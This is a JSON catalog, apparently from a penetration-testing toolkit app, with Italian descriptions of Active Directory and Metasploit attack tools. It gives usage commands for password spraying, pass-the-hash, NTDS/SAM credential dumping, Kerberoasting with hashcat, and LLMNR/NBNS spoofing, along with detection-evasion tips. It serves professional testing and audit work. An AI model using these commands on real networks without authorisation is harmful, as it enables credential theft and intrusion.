[
  {
    "id": "metasploit-pentest-plugin",
    "name": "Pentest-plugin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/darkoperator/Metasploit-Plugins",
    "desc": "Plugin per Metasploit che automatizza discovery di rete, auto-exploitation da report (Nessus/OpenVAS) e post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Il Pentest Plugin di darkoperator è un'estensione essenziale per il framework Metasploit, progettata per accelerare le fasi ripetitive di un penetration test. Permette di importare i report di vulnerabilità da scanner terzi (come Nessus, Qualys, OpenVAS) e tentare automaticamente l'exploitation dei target vulnerabili (<code>auto_exploit</code>). Inoltre, offre comandi avanzati per la discovery di rete e la gestione massiva di sessioni post-exploitation, facilitando il pivoting e la raccolta dati su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Exploitation:</strong> La \"killer feature\" del plugin. Analizza le vulnerabilità importate nel database (db_import) e mappa automaticamente le CVE ai moduli exploit disponibili in Metasploit, lanciandoli contro i target specificati. Include filtri per escludere exploit DoS o instabili.</p><p><strong>Post-Exploitation Massiva:</strong> Comandi come <code>multi_post</code> e <code>multi_meter_cmd</code> permettono di eseguire moduli di post-exploitation o comandi console su tutte le sessioni attive simultaneamente (o su un subset filtrato), riducendo drasticamente il tempo necessario per enumerare credenziali o hash su reti compromesse.</p><p><strong>Project Management:</strong> Migliora la gestione del workflow creando workspace isolati per cliente e salvando automaticamente i log delle attività, essenziale per il reporting professionale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il plugin nella console msf e importare uno scan.</p><pre><code># Caricamento plugin\nmsf > load pentest\n\n# Importazione report Nessus e auto-exploit\nmsf > db_import scan_results.nessus\nmsf > auto_exploit -match_port -rating high -j\n\n# Esecuzione comando su tutte le sessioni Windows\nmsf > multi_cmd -c \"whoami\" -s Windows</code></pre><p>Richiede una connessione al database postgresql attiva (<code>msfdb init</code>) per funzionare correttamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Internal Network Pentest</strong>, dopo aver scansionato una subnet con Nessus, il plugin permette di verificare rapidamente quali vulnerabilità siano realmente sfruttabili (exploit validation) senza configurare manualmente centinaia di moduli. Durante fasi di <strong>Red Teaming</strong>, la gestione centralizzata delle sessioni aiuta a mantenere la situational awareness su molti host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di <code>auto_exploit</code> è estremamente rumoroso (\"Hail Mary attack\") e genererà migliaia di alert su IDS/IPS. Può causare crash di servizi legacy.</p><p><strong>Mitigazioni:</strong> Utilizzare whitelist di host specifici. Preferire l'uso mirato dei comandi post-exploitation su sessioni già stabilite piuttosto che l'auto-exploit indiscriminato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Metasploit_Plugins"
    ],
    "notes": null
  },
  {
    "id": "scipag-vulscan",
    "name": "Vulscan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/scipag/vulscan",
    "desc": "Modulo NSE per Nmap che converte output di version detection in suggerimenti CVE tramite database offline di vulnerabilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Vulscan trasforma il port scanner Nmap in uno strumento di vulnerability assessment preliminare, sfruttando il motore di scripting NSE. A differenza degli scanner attivi tradizionali, Vulscan opera correlando localmente le versioni dei servizi rilevati (fingerprinting) con molteplici database di vulnerabilità offline. Questo approccio permette di identificare potenziali CVE senza inviare pacchetti di exploit o traffico di scansione vulnerabilità specifico verso il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correlazione Offline:</strong> La funzione core del tool è il matching testuale tra la stringa di versione del servizio (es. 'Apache 2.4.49') e i record contenuti nei file CSV locali (ExploitDB, CVE, SecurityFocus). Poiché non richiede query online, garantisce totale riservatezza sulle vulnerabilità ricercate e funziona perfettamente in ambienti segregati o air-gapped.</p><p><strong>Supporto Multi-Database:</strong> Vulscan integra nativamente diversi repository di vulnerabilità, inclusi cve.csv, exploitdb.csv e scipvuldb.csv. L'utente può scegliere di interrogare un singolo database per rapidità o tutti simultaneamente per la massima copertura, personalizzando il livello di dettaglio dell'output.</p><p><strong>Integrazione Nmap:</strong> Essendo uno script NSE, beneficia di tutta la flessibilità di Nmap: può essere combinato con opzioni di evasione firewall, timing template e output in vari formati (XML, Grepable), rendendolo facilmente integrabile in pipeline di CI/CD o script di automazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo richiede l'installazione dello script nella directory <code>scripts</code> di Nmap e la presenza dei file CSV dei database. Il comando base invoca lo script durante una scansione con detection delle versioni attiva (<code>-sV</code>).</p><pre><code># Scansione con output standard (tutti i DB)\nnmap -sV --script=vulscan/vulscan.nse target.com\n\n# Scansione focalizzata su exploit noti\nnmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p>Per mantenere l'efficacia del tool, è necessario aggiornare regolarmente i file CSV utilizzando lo script <code>update.sh</code> fornito nel repository, poiché Vulscan non scarica definizioni in tempo reale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Triage Iniziale</strong>, Vulscan offre una panoramica rapida dei vettori di attacco più probabili su un perimetro vasto, permettendo di prioritizzare quali host analizzare con scanner più pesanti. In contesti <strong>High Security / Air-Gapped</strong>, dove non è possibile utilizzare scanner cloud-based o che richiedono aggiornamenti online, Vulscan rappresenta una soluzione autonoma ed efficace. Per i <strong>CTF e Red Teaming</strong>, fornisce suggerimenti immediati su exploit pubblici disponibili per i servizi esposti senza il rumore generato da tool come Nessus.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Vulscan in sé è passivo (analizza l'output di Nmap), ma la scansione Nmap sottostante con flag <code>-sV</code> (Version Detection) è attiva e interagisce con i servizi per estrarre i banner. Questo genera log applicativi e traffico di rete riconoscibile.</p><p><strong>Impatto operativo:</strong> Basso rischio di crash dei servizi rispetto a scanner attivi, ma la scansione di versione può essere lenta su grandi range di IP.</p><p><strong>Mitigazioni:</strong> I risultati sono basati sulla versione dichiarata, quindi sono possibili falsi positivi (se le patch sono state backportate) e falsi negativi (se il banner è oscurato). Verificare sempre manualmente le finding prima di lanciare exploit.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Scripts"
    ],
    "notes": null
  },
  {
    "id": "adrecon",
    "name": "ADRecon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/sense-of-security/ADRecon",
    "desc": "Tool PowerShell per raccolta completa di artefatti Active Directory (trust, GPO, deleghe, utenti privilegiati) con report Excel.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ADRecon è lo strumento definitivo per la fotografia statica dello stato di sicurezza di un ambiente Active Directory. Eseguito con privilegi di utente standard o amministrativi, estrae una mole massiva di informazioni strutturali e di sicurezza dal Domain Controller, consolidandole in un report Excel multipagina. È progettato per facilitare l'identificazione di misconfigurazioni complesse, relazioni di trust e violazioni di best practice senza richiedere agenti permanenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Olistica:</strong> ADRecon non si limita agli utenti e computer, ma mappa l'intera foresta: relazioni di trust, site e subnet, Group Policy Object (GPO) con relativi link, deleghe Kerberos (Unconstrained/Constrained), e configurazioni LAPS. Questa visibilità completa è cruciale per comprendere la superficie d'attacco reale dell'infrastruttura.</p><p><strong>Analisi GPO e ACL:</strong> Il tool analizza i permessi critici e le impostazioni delle policy, evidenziando chi ha diritti di modifica su oggetti sensibili (es. AdminSDHolder) o quali GPO applicano configurazioni insicure (es. SMB Signing disabilitato). Questo livello di dettaglio aiuta a tracciare percorsi di privilege escalation basati su misconfigurazioni logiche.</p><p><strong>Reporting Strutturato:</strong> Il valore distintivo di ADRecon è l'output: un file Excel autogenerato con fogli separati per ogni categoria di oggetto (Domain Controllers, Users, Groups, GPO, ecc.) e dashboard riassuntive. Questo formato rende i dati immediatamente consumabili sia per analisi tecniche che per presentazioni executive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ADRecon è uno script PowerShell che può essere eseguito direttamente da un host unito al dominio o tramite <code>runas</code> con credenziali di dominio (es. tramite <code>/netonly</code>). Non richiede installazione, ma necessita del modulo Active Directory o RSAT per funzionalità complete.</p><pre><code># Esecuzione standard con credenziali correnti\nPS C:\\> .\\ADRecon.ps1\n\n# Esecuzione su dominio target specifico con credenziali\nPS C:\\> .\\ADRecon.ps1 -DomainController dc01.corp.local -Credential (Get-Credential)</code></pre><p>L'esecuzione può richiedere diversi minuti a seconda della dimensione del dominio. Al termine, il report viene salvato nella cartella di output con timestamp, pronto per l'analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation Enumeration</strong>, ADRecon viene lanciato dopo aver ottenuto un accesso iniziale per mappare rapidamente il terreno e identificare obiettivi di alto valore (High Value Targets) e percorsi di movimento laterale. Per <strong>Security Assessment e Audit</strong>, fornisce una snapshot auditabile della conformità dell'AD, evidenziando account obsoleti, password policy deboli e trust non necessari. Nelle operazioni di <strong>M&A (Mergers and Acquisitions)</strong>, permette di valutare rapidamente il rischio di sicurezza di un dominio acquisito prima di stabilire trust bidirezionali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> ADRecon genera un volume elevato di query LDAP verso il Domain Controller, che può essere rilevato da soluzioni di monitoraggio (es. Microsoft Defender for Identity) come attività di ricognizione anomala. L'esecuzione scrive file su disco.</p><p><strong>Impatto operativo:</strong> L'estrazione massiva di dati può causare un leggero carico sulla rete e sul DC in ambienti molto grandi, ma raramente causa disservizi.</p><p><strong>Mitigazioni:</strong> Eseguire il tool da una macchina non monitorata o durante finestre di manutenzione. Se possibile, utilizzare tecniche di \"living off the land\" più discrete per query mirate se l'obiettivo è stealth assoluto. Proteggere il report Excel generato poiché contiene la mappa completa della rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec-win",
    "name": "CrackMapExecWin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/CrackMapExecWin",
    "desc": "Framework post-exploitation multi-protocollo (SMB/WinRM/LDAP) per network sweeping, spraying, esecuzione comandi e attacchi modulari su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (spesso abbreviato in CME e ora evoluto in NetExec) è il \"coltellino svizzero\" per il pentesting di ambienti Windows/Active Directory. Consente di eseguire azioni massive su intere subnet sfruttando protocolli nativi come SMB, WMI, WinRM e MSSQL. Il tool gestisce automaticamente l'autenticazione, il mantenimento delle sessioni e l'esecuzione di moduli per l'enumerazione, il lateral movement e l'esfiltrazione di dati, mantenendo un database interno degli host compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Sweeping & Credential Spraying:</strong> CME eccelle nel validare credenziali su larga scala. Può testare una coppia username/password o un hash NTLM (Pass-the-Hash) contro centinaia di host simultaneamente per individuare dove l'utente ha privilegi di accesso o amministrativi (Pwn3d!). Integra meccanismi di controllo per evitare il blocco degli account durante attacchi di password spraying.</p><p><strong>Esecuzione Comandi & Lateral Movement:</strong> Una volta identificati i privilegi amministrativi, il tool permette l'esecuzione remota di comandi cmd o PowerShell tramite metodi multipli (atexec, smbexec, wmiexec), spesso senza caricare binari sul disco target. Facilita il movimento laterale iniettando payload Meterpreter o Cobalt Strike beacon direttamente in memoria.</p><p><strong>Modularità Estensibile:</strong> Il vero potenziale risiede nel sistema di moduli. È possibile eseguire task complessi post-autenticazione come il dump del database SAM (<code>--sam</code>), l'estrazione di credenziali LSA (<code>--lsa</code>), l'enumerazione di sessioni loggate, il controllo delle difese antivirus (<code>enum_avproducts</code>) o l'esecuzione di Mimikatz, tutto automatizzato e parallelo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi segue lo schema: <code>protocollo target opzioni</code>. È fondamentale specificare le credenziali (in chiaro o hash) e l'azione desiderata.</p><pre><code># Spraying di password su una subnet SMB\ncrackmapexec smb 192.168.1.0/24 -u user.txt -p 'Password123'\n\n# Pass-the-Hash per eseguire comandi (check privilegi Admin)\ncrackmapexec smb 10.0.0.50 -u Administrator -H <NTLM_HASH> -x \"whoami\"\n\n# Dump del database NTDS (richiede Domain Admin)\ncrackmapexec smb dc01.corp.local -u Admin -p Pass --ntds drsuapi</code></pre><p>CME mantiene un database interno (<code>cmedb</code>) che traccia automaticamente quali host sono stati compromessi, permettendo di interrogare rapidamente i risultati senza dover ripetere le scansioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante il <strong>Lateral Movement</strong>, CME è lo strumento primario per identificare rapidamente su quali altre macchine le credenziali appena compromesse sono valide, permettendo di espandere l'accesso orizzontalmente. In fase di <strong>Privilege Escalation</strong>, moduli come <code>spider_plus</code> possono cercare file sensibili contenenti password nelle share di rete accessibili. Per l'<strong>Audit delle Password</strong>, permette di verificare la conformità delle policy (es. riutilizzo password local admin) su tutto il parco macchine in pochi secondi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> CME è intrinsecamente rumoroso. Le scansioni su ampi range IP generano traffico SMB/RPC massivo e sequenziale, creando picchi di eventi di \"Logon\" (4624) e \"Logon Failure\" (4625) facilmente correlabili dai SIEM. L'uso di tecniche come <code>psexec</code> lascia artefatti di servizio nei log di sistema.</p><p><strong>Impatto operativo:</strong> Il password spraying mal configurato può causare il blocco massivo degli account utente. L'esecuzione di comandi pesanti su molti host contemporaneamente può saturare la banda o le risorse dei target.</p><p><strong>Mitigazioni:</strong> Utilizzare opzioni di <code>--jitter</code> e <code>--sleep</code> per rallentare le scansioni e renderle meno deterministiche. Preferire protocolli meno monitorati come WinRM rispetto a SMB se possibile. Evitare l'uso di moduli che caricano binari su disco (es. Mimikatz) se è presente un EDR attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "domainpasswordspray",
    "name": "DomainPasswordSpray.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/DomainPasswordSpray",
    "desc": "Script PowerShell per password spraying su Active Directory con generazione automatica userlist e protezione lockout intelligente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DomainPasswordSpray automatizza una delle tecniche più efficaci per ottenere accesso iniziale: il password spraying. A differenza del brute-force tradizionale, questo tool inverte la logica provando una singola password comune contro tutti gli utenti del dominio. È progettato con una forte enfasi sulla sicurezza operativa (OPSEC), integrando controlli automatici per evitare il blocco degli account utente e l'interruzione dei servizi business-critical.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Userlist Dinamica:</strong> Invece di richiedere liste esterne, lo script interroga direttamente il dominio per ottenere l'elenco aggiornato degli utenti attivi. Filtra automaticamente account disabilitati o che hanno già un conteggio di \"Bad Password\" pericolosamente vicino alla soglia di lockout, proteggendo l'operazione.</p><p><strong>Smart Lockout Avoidance:</strong> Prima di ogni tentativo, verifica la policy delle password del dominio (o le Fine Grained Password Policies se applicabili) per assicurarsi che lo spraying non triggeri blocchi di massa. Include funzionalità di resume per riprendere l'attacco esattamente da dove interrotto in caso di stop.</p><p><strong>Supporto Multi-Protocollo:</strong> Può eseguire la validazione delle credenziali utilizzando diversi metodi, tra cui LDAP (default) o Kerberos Pre-Authentication. Quest'ultimo è spesso preferibile in quanto genera log meno evidenti rispetto a tentativi di login NTLM/LDAP falliti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script deve essere importato in una sessione PowerShell autenticata (anche con utente non privilegiato). L'esecuzione base richiede solo la password da testare.</p><pre><code># Spraying base con una password (es. StagioneAnno)\nInvoke-DomainPasswordSpray -Password \"Estate2024!\"\n\n# Spraying con output su file e lista utenti manuale\nInvoke-DomainPasswordSpray -UserList users.txt -Password \"Password123\" -OutFile spray_results.txt\n\n# Modalità continua con lista password (attesa automatica tra tentativi)\nInvoke-DomainPasswordSpray -PasswordList common_passwords.txt -SleepMinutes 35</code></pre><p>È fondamentale utilizzare il parametro <code>-SleepMinutes</code> quando si testano più password per rispettare la finestra di reset del contatore dei tentativi falliti (solitamente 30 minuti).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Initial Access</strong> interna, quando si possiede un dispositivo nella rete ma nessuna credenziale valida, lo spraying permette spesso di compromettere il primo account utente sfruttando password deboli. In fase di <strong>Lateral Movement</strong>, può essere usato per identificare se le credenziali di un account compromesso sono condivise su altri profili (password reuse). Per i <strong>Blue Team</strong>, è uno strumento essenziale per audit periodici della robustezza delle password degli impiegati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche se attento, lo spraying genera un volume elevato di eventi 4625 (Logon Failed) o 4771 (Kerberos Pre-Auth Failed) in un breve lasso di tempo. I SIEM moderni rilevano facilmente il pattern \"singola sorgente, molti target falliti\".</p><p><strong>Impatto operativo:</strong> Se la policy di lockout è configurata male o lo stato del dominio non è sincronizzato, esiste il rischio residuo di bloccare account legittimi. Verificare sempre la policy prima di lanciare.</p><p><strong>Mitigazioni:</strong> Eseguire lo spray in modalità \"low and slow\" (una password al giorno o ogni ora). Se possibile, ruotare l'indirizzo IP sorgente o utilizzare host multipli per distribuire il carico di eventi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "getuserspns-windows",
    "name": "GetUserSPNs_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/impacket-examples-windows",
    "desc": "Tool Impacket per esecuzione attacco Kerberoasting: enumera SPN e richiede ticket TGS cifrati per cracking password offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GetUserSPNs è l'implementazione compilata per Windows del celebre script Python di Impacket, strumento cardine per l'attacco di Kerberoasting. Permette a qualsiasi utente autenticato nel dominio di richiedere i Service Principal Names (SPN) associati agli account di servizio e di ottenere i relativi ticket TGS (Ticket Granting Service). Questi ticket, cifrati con la password dell'account di servizio, possono essere estratti e attaccati offline per rivelare le credenziali in chiaro senza interagire ulteriormente con il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione SPN:</strong> Il tool scansiona la directory Active Directory alla ricerca di account utente configurati come service account (che possiedono un attributo `servicePrincipalName`). Questo permette di identificare rapidamente target di alto valore come account SQL, IIS o di backup.</p><p><strong>Richiesta TGS (Kerberoasting):</strong> Una volta identificati gli account, invia richieste legittime al KDC per ottenere i ticket di servizio. Il KDC risponde con un ticket cifrato che contiene, nella sua struttura, materiale crittografico derivato dalla password dell'account target.</p><p><strong>Formattazione Hash:</strong> L'output può essere salvato in formati compatibili con i principali password cracker (Hashcat e John the Ripper), facilitando il passaggio immediato alla fase di cracking offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool viene eseguito da riga di comando. Se eseguito da una macchina in dominio con sessione utente attiva, non richiede credenziali; altrimenti, accetta username e password/hash.</p><pre><code># Enumerazione e richiesta ticket (output a video)\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 domain.local/user\n\n# Salvataggio ticket formattati per Hashcat\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 -outputfile hashes.txt domain.local/user\n\n# Autenticazione Pass-the-Hash\nGetUserSPNs.exe -request -hashes :ntlm_hash domain.local/user</code></pre><p>I file generati possono essere crackati con Hashcat usando il modulo 13100: <code>hashcat -m 13100 hashes.txt wordlist.txt</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Kerberoasting è la tecnica standard per l'<strong>Escalation dei Privilegi</strong> in ambiente AD. Spesso gli account di servizio hanno privilegi amministrativi (es. Domain Admins o Local Admins su server critici) e password deboli o mai ruotate. È efficace anche per stabilire <strong>Persistenza</strong>: una volta ottenuta la password di un service account, l'attaccante può generare Silver Ticket per accedere ai servizi specifici senza lasciare tracce sul Domain Controller.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La richiesta di ticket TGS per servizi con cifratura RC4 (obsoleta) è un indicatore forte (Event ID 4769). Richieste multiple di TGS in rapida successione da un singolo host sono facilmente rilevabili da Defender for Identity.</p><p><strong>Impatto operativo:</strong> L'attacco è passivo sui sistemi target (non causa crash), ma genera traffico verso il DC.</p><p><strong>Mitigazioni:</strong> Utilizzare service account gMSA (Managed Service Accounts) con password complesse e rotazione automatica. Monitorare l'uso della cifratura RC4 in Kerberos.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "group3r",
    "name": "Group3r",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Group3r/Group3r",
    "desc": "Motore di analisi GPO che identifica misconfigurazioni exploitable, credenziali in chiaro e permessi di scrittura pericolosi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Group3r è uno strumento specializzato nell'analisi offensiva delle Group Policy Object (GPO). A differenza dei tool di audit generici, Group3r si concentra esclusivamente su configurazioni errate che possono essere sfruttate attivamente da un attaccante per elevare i privilegi o persistere nella rete. Analizza file system (SYSVOL), attributi AD e contenuti delle policy per trovare \"aghi nel pagliaio\" come password decifrabili, script modificabili o assegnazioni di diritti rischiosi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rilevamento Credenziali:</strong> Cerca attivamente rimasugli di Group Policy Preferences (GPP) contenenti password \"cpassword\" (decifrabili staticamente) e scansiona script di logon/startup alla ricerca di credenziali hardcoded o file di configurazione sensibili distribuiti via GPO.</p><p><strong>Analisi Permessi GPO:</strong> Verifica le Access Control List (ACL) degli oggetti GPO per identificare se l'utente corrente (o un gruppo di cui fa parte) ha diritti di scrittura. Modificare una GPO permette di eseguire codice su tutti i computer o utenti a cui la policy è applicata.</p><p><strong>Controllo Integrità SYSVOL:</strong> Controlla se i file fisici delle policy residenti nella share SYSVOL sono scrivibili da utenti non privilegiati, un vettore comune per inserire backdoor negli script di avvio aziendali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Group3r deve essere eseguito da un host unito al dominio. Non richiede privilegi amministrativi per la maggior parte delle operazioni di lettura.</p><pre><code># Analisi completa con output su file HTML e JSON\n.\\group3r.exe -f report.html -o json\n\n# Analisi focalizzata solo su finding ad alto impatto\n.\\group3r.exe -s High\n\n# Inclusione di dati SYSVOL (richiede accesso alla share)\n.\\group3r.exe --sysvol</code></pre><p>L'output colorato in console aiuta a identificare immediatamente le criticità, mentre il report HTML fornisce dettagli tecnici e comandi per verificare o sfruttare le vulnerabilità trovate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Privilege Escalation</strong>, Group3r rivela percorsi non ovvi: ad esempio, scoprire che il gruppo \"HelpDesk\" può modificare la GPO \"Default Domain Policy\" garantisce il controllo totale sul dominio. In attività di <strong>Post-Exploitation</strong>, permette di mappare dove vengono distribuiti software o configurazioni, facilitando il movimento laterale verso target specifici. Per i <strong>Defense Team</strong>, aiuta a sanare debiti tecnici storici nelle configurazioni AD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'analisi comporta una lettura intensiva di oggetti AD e file su SYSVOL. Anche se il traffico è legittimo (lettura policy), il volume e la velocità possono insospettire sistemi di monitoraggio comportamentale.</p><p><strong>Impatto operativo:</strong> Minimo, essenzialmente operazioni di lettura. L'accesso a SYSVOL è traffico SMB standard.</p><p><strong>Mitigazioni:</strong> Eseguire il tool localmente e off-line se possibile (esportando prima i dati) o rallentare l'esecuzione. Non tentare l'exploit automatico delle GPO trovate senza autorizzazione esplicita, poiché l'impatto è globale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "inveigh-exe",
    "name": "Inveigh.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Spoofer e Man-in-the-Middle framework .NET per cattura hash e NTLM relay su reti Windows (LLMNR/mDNS/NBNS).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Inveigh (versione C#/.NET) è l'evoluzione del celebre script PowerShell, progettato per eseguire attacchi Man-in-the-Middle (MITM) e spoofing su reti locali Windows. Intercettando richieste di risoluzione nomi multicast/broadcast (LLMNR, NBT-NS, mDNS), inganna i client vittime facendosi passare per le risorse cercate. Questo permette di catturare hash NetNTLMv1/v2 o di eseguire attacchi di relay verso altri servizi, il tutto da un binario autonomo che non richiede PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofing Multiprotocollo:</strong> Risponde a richieste LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) e mDNS. Supporta anche lo spoofing DHCPv6 per attacchi su reti IPv6, spesso trascurate dai difensori ma abilitate di default.</p><p><strong>Listener Integrati:</strong> Include server rogue per SMB, HTTP/HTTPS, DNS e LDAP. Questi listener catturano le negoziazioni di autenticazione in arrivo dai client dirottati, registrando credenziali e hash per il cracking.</p><p><strong>NTLM Relay:</strong> Invece di limitarsi a catturare gli hash, Inveigh può inoltrarli in tempo reale verso altri target validi (SMB Relay) per eseguire comandi o ottenere accesso non autorizzato, coordinandosi con tecniche di cross-protocol relay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia a riga di comando è interattiva e offre controllo granulare. Richiede privilegi elevati (Amministratore/SYSTEM) per aprire socket raw e porte privilegiate (445, 80, 53).</p><pre><code># Avvio base (Spoofing LLMNR/mDNS, Listener SMB/HTTP)\nInveigh.exe\n\n# Avvio con parametri specifici (IP spoofing, disabilita NBNS)\nInveigh.exe -IP 192.168.1.50 -NBNS N\n\n# Modalità sola analisi (senza spoofing attivo)\nInveigh.exe -Inspect</code></pre><p>Durante l'esecuzione, premere <code>ESC</code> per entrare nella console di gestione e visualizzare le catture in tempo reale con comandi come <code>GET NTLMV2</code> o <code>GET USERS</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Inveigh è fondamentale nelle fasi iniziali di un <strong>Internal Pentest</strong> per ottenere rapidamente credenziali valide sfruttando il traffico di background della rete. È particolarmente efficace la mattina presto o dopo i riavvii, quando i PC cercano risorse di rete. In scenari di <strong>Red Teaming</strong>, la versione compilata è preferita alla versione PowerShell per evitare le detection AMSI e i log di script block, offrendo maggiore stabilità in lunghe sessioni di ascolto.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso a livello di rete. IDS/IPS rilevano facilmente risposte non sollecitate o anomale ai protocolli broadcast. Defender for Identity segnala attività di spoofing.</p><p><strong>Impatto operativo:</strong> Può causare conflitti IP o malfunzionamenti di rete se configurato male. Il relay SMB può bloccare l'accesso alle risorse legittime per la vittima durante l'attacco.</p><p><strong>Mitigazioni:</strong> Usare whitelist/blacklist per targettizzare solo macchine specifiche. Disabilitare protocolli legacy (NBNS) se non necessari. Limitare la durata dell'attacco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "inveigh-ps1",
    "name": "Inveigh.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Versione PowerShell legacy di Inveigh per attacchi MITM fileless e spoofing LLMNR/NBNS in ambienti con restrizioni sui binari.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Inveigh.ps1 è la versione originale in PowerShell del tool di spoofing. Sebbene la versione EXE sia più performante, lo script PS1 rimane vitale per scenari \"fileless\" o \"living off the land\", dove caricare binari compilati sul disco è impossibile o troppo rischioso. Offre le stesse capacità core di poisoning LLMNR/NBNS e cattura credenziali, eseguendo tutto in memoria all'interno di un processo PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Esecuzione Fileless:</strong> Può essere caricato direttamente in memoria (es. tramite download cradle) senza toccare il disco, bypassando controlli antivirus basati su file statici.</p><p><strong>Spoofing & Capture:</strong> Gestisce lo spoofing dei nomi e l'ascolto su protocolli HTTP/SMB per catturare challenge NTLM. Include funzionalità per output formattato compatibile con Hashcat.</p><p><strong>Integrazione Framework:</strong> Essendo uno script, è facilmente integrabile in framework di C2 come Empire o Covenant, o eseguibile tramite sessioni di gestione remota (WinRM) esistenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Importare il modulo ed invocare la funzione principale. Richiede privilegi amministrativi locale.</p><pre><code># Import ed esecuzione base\nImport-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y\n\n# Esecuzione stealth con download in memoria e timer di 